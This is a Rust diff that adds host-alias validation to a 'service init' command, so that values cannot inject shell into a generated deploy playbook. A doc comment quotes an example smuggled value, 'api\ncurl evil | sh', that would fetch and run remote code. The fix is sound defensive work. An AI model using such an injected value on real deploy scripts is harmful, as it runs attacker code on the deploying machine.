@@ -46,14 +46,20 @@ pub(crate) fn run(cmd: &ServiceCmd) -> Result<()> {
 /// Scaffold a service (`service init`).
 fn init(cmd: &ServiceInitArgs) -> Result<()> {
     let service = cmd.service.trim();
-    let hosts: Vec<String> = if cmd.hosts.is_empty() {
-        vec!["api".to_string()]
-    } else {
-        cmd.hosts.iter().map(|h| h.trim().to_string()).filter(|h| !h.is_empty()).collect()
-    };
+    // Validate before touching the filesystem, and validate every value that
+    // reaches the generated playbook.
     validate_service_name(service)?;
+    let mut hosts: Vec<String> = Vec::new();
+    for raw in &cmd.hosts {
+        let host = raw.trim();
+        if host.is_empty() {
+            continue;
+        }
+        validate_host_alias(host)?;
+        hosts.push(host.to_string());
+    }
     if hosts.is_empty() {
-        bail!("no hosts given: pass `--host <alias>` with a non-empty value");
+        hosts.push("api".to_string());
     }
 
     let dir = PathBuf::from(format!("services/{service}"));
@@ -108,6 +114,23 @@ fn validate_service_name(service: &str) -> Result<()> {
         !service.contains("--");
     if !valid {
         bail!("invalid service name `{service}` (want [a-z][a-z0-9-]*)");
+    }
+    Ok(())
+}
+
+/// Validate a `--host` value: it becomes a server alias, a `@copy`/`@remote`
+/// target, and a line of generated shell.
+///
+/// Whitespace and newlines are rejected because the value is interpolated
+/// straight into `playbooks/deploy-<svc>.sh` (`__SERVER_LINES__`,
+/// `__HOST__`) without escaping. Without this check, a host such as
+/// `api\ncurl evil | sh` injects commands into the generated playbook's
+/// **executable body**, not just into its comment lines.
+fn validate_host_alias(host: &str) -> Result<()> {
+    let valid = !host.is_empty() &&
+        host.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'));
+    if !valid {
+        bail!("invalid host alias `{host}` (want [A-Za-z0-9._-]+, no whitespace)");
     }
     Ok(())
 }
